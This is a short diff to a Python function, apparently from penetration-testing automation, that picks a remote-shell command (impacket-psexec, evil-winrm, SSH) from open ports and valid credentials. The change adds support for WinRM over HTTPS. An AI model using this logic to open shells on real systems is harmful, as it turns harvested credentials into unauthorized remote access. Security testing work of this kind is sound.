@@ -93,9 +93,12 @@ def shell_command(facts, ip: str) -> list[str] | None:
         target = f"{domain}/{user}:{pw}@{ip}" if domain else f"{user}:{pw}@{ip}"
         return ["impacket-psexec", target]
 
-    if 5985 in open_tcp and valid:
+    if (5985 in open_tcp or 5986 in open_tcp) and valid:
         user, pw = _prefer_user(valid)
-        return ["evil-winrm", "-i", ip, "-u", user, "-p", pw]
+        cmd = ["evil-winrm", "-i", ip, "-u", user, "-p", pw]
+        if 5986 in open_tcp and 5985 not in open_tcp:
+            cmd.append("-S")                       # WinRM over HTTPS (5986)
+        return cmd
 
     if 22 in open_tcp and valid:
         user, pw = _prefer_user(valid)
